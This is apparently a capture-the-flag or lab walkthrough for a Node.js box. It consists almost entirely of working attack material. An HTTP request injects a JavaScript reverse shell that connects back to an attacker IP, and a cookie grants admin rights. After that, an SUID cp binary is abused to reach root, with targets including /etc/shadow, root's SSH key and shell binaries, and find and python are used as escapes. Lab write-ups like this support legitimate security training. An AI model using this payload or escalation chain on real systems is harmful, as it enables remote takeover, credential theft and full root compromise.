### Foothold by node.js command injection RCE
```
POST /logs/new HTTP/1.1
Host: 192.168.212.110:3000
Content-Length: 567
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.212.110:3000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.212.110:3000/logs
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: connect.sid=s%3A7wvq51PtkEYM3J8niXJLxHNTL97Oppbi.Kdqvog9KJ%2BpoIa8dlNgH%2B%2BTyro3eiNPqRZeUSZuMy5s; userLevel=YWRtaW4=
Connection: close

username=foo&msg=%28function%28%29%7B%0D%0A++++var+net+%3D+require%28%22net%22%29%2C%0D%0A++++++++cp+%3D+require%28%22child_process%22%29%2C%0D%0A++++++++sh+%3D+cp.spawn%28%22sh%22%2C+%5B%5D%29%3B%0D%0A++++var+client+%3D+new+net.Socket%28%29%3B%0D%0A++++client.connect%2880%2C+%22192.168.49.212%22%2C+function%28%29%7B%0D%0A++++++++client.pipe%28sh.stdin%29%3B%0D%0A++++++++sh.stdout.pipe%28client%29%3B%0D%0A++++++++sh.stderr.pipe%28client%29%3B%0D%0A++++%7D%29%3B%0D%0A++++return+%2Fa%2F%3B+%2F%2F+Prevents+the+Node.js+application+from+crashing%0D%0A%7D%29%28%29%3B
```
### Priv Enum
```bash
-rwsr-xr-x. 1 root root 156K Apr 23  2020 /usr/bin/cp

╔══════════╣ Unexpected in root
/.autorelabel

/usr/bin/mongod --dbpath /var/lib/mongo --bind_ip 0.0.0.0 --logpath /var/log/mongodb/mongod.log

╔══════════╣ Analyzing Mongo Files (limit 70)
Version: MongoDB shell version v4.2.9
git version: 06402114114ffc5146fd4b55402c96f1dc9ec4b5
OpenSSL version: OpenSSL 1.0.1e-fips 11 Feb 2013
allocator: tcmalloc
modules: none
build environment:
    distmod: rhel70
    distarch: x86_64
    target_arch: x86_64
db version v4.2.9
git version: 06402114114ffc5146fd4b55402c96f1dc9ec4b5
OpenSSL version: OpenSSL 1.0.1e-fips 11 Feb 2013
allocator: tcmalloc
modules: none
build environment:
    distmod: rhel70
    distarch: x86_64
    target_arch: x86_64
Possible mongo anonymous authentication

LFILE=/root/proof.txt
LFILE=/root/.ssh/id_rsa
LFILE=/root/.ssh/id_rsa

LFILE=/bin/unzip

LFILE=/tmp/mongodb-27017.sock

LFILE=/etc/shadow

LFILE=/root/proof.txt

LFILE=/bin/sh
LFILE=/bin/bash
LFILE=/bin/zsh
LFILE=/usr/bin/zsh
LFILE=/usr/bin/python
LFILE=/usr/bin/python3

LFILE=/usr/bin/find  <- works fine

/usr/bin/cp --attributes-only --preserve=all /usr/bin/cp "$LFILE"

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
# Root
```bash
find /tmp/a.txt -exec "/bin/bash" -p \;

# Or just copy the flag since we can!

cp /root/proof.txt /tmp/a.txt
```

https://medium.com/go-cyber/linux-privilege-escalation-with-suid-files-6119d73bc620